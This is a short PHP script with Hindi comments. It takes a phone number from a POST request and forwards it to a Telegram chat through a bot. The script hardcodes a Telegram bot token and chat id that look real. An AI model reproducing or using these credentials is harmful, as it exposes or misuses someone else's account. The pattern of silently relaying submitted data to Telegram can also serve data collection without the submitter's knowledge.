here<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $data = json_decode(file_get_contents("php://input"), true);

    $number = $data["number"];
    $botToken = "7712484168:AAGlbiVYuf8WH5ElQaD9G5uAaDgRMcuXrQg";   // 👉 यहां अपना BotFather वाला token डालें
    $chatId  = "7438329471";      // 👉 यहां अपना chat_id डालें (user/bot group id)

    $message = "📱 New Number: " . $number;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $postData = [
        "chat_id" => $chatId,
        "text"    => $message
    ];

    $options = [
        "http" => [
            "header"  => "Content-Type: application/json\r\n",
            "method"  => "POST",
            "content" => json_encode($postData),
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    echo $result;
}
?>
